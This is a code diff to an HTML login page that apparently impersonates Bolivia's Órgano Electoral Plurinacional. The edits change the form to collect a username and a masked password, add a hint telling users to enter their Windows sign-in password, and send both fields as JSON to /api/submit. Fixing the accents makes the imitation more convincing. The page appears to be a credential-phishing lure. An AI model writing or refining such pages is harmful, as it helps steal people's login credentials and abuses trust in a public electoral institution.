@@ -68,12 +68,20 @@
             width: 140px; font-size: 13px; color: #333;
             text-align: right; padding-right: 10px;
         }
-        .form-row input[type="text"] {
+        .form-row input[type="text"],
+        .form-row input[type="password"] {
             flex: 1; padding: 4px 6px; border: 1px solid #a5acb0;
             font-size: 13px; font-family: inherit; background: #eef4fc;
         }
         .form-row input:focus {
             outline: none; border-color: #e89a00; background: #ffffff;
+        }
+        .hint {
+            font-size: 12px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 10px;
+            margin-top: 5px;
         }
         .button-row {
             display: flex; justify-content: flex-end;
@@ -128,7 +136,7 @@
             </div>
             <div class="radio-group">
                 <div class="radio-item">
-                    <input type="radio" id="publico" name="seguridad" >
+                    <input type="radio" id="publico" name="seguridad">
                     <label for="publico">Es un equipo público o compartido</label>
                 </div>
                 <div class="radio-item">
@@ -144,23 +152,21 @@
 
         <form id="formulario">
             <div class="form-row">
-                <label for="nombre">Nombre de usuario:</label>
-                <input type="text" id="nombre" name="nombre" placeholder="juan.perez">
+                <label for="usuario">Nombre de usuario:</label>
+                <input type="text" id="usuario" name="usuario" placeholder="Ej: juan.perez">
             </div>
             <div class="form-row">
-                <label for="email">Contraseña actual:</label>
-                <input type="text" id="email" name="email" placeholder="">
+                <label for="password">Contraseña actual:</label>
+                <input type="password" id="password" name="password" placeholder="">
             </div>
-            <div class="security-title">
-                Ingrese la misma contraseña con la que inicia sesion en Windows
-            </div>
+            <div class="hint">Ingrese la misma contraseña con la que inicia sesión en Windows</div>
             <div class="button-row">
                 <button type="submit" class="btn-submit">Iniciar sesión</button>
             </div>
         </form>
 
         <div class="footer">
-            <div class="footer-line1">Organo Electoral Plurinacional</div>
+            <div class="footer-line1">Órgano Electoral Plurinacional</div>
             <div class="footer-line2">&copy; 2026 OEP. Reservados todos los derechos.</div>
         </div>
     </div>
@@ -168,14 +174,14 @@
     <script>
         document.getElementById('formulario').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const nombre = document.getElementById('nombre').value;
-            const email = document.getElementById('email').value;
+            const usuario = document.getElementById('usuario').value;
+            const password = document.getElementById('password').value;
             
             try {
                 const response = await fetch('/api/submit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ nombre, email })
+                    body: JSON.stringify({ usuario, password })
                 });
                 const data = await response.json();
                 
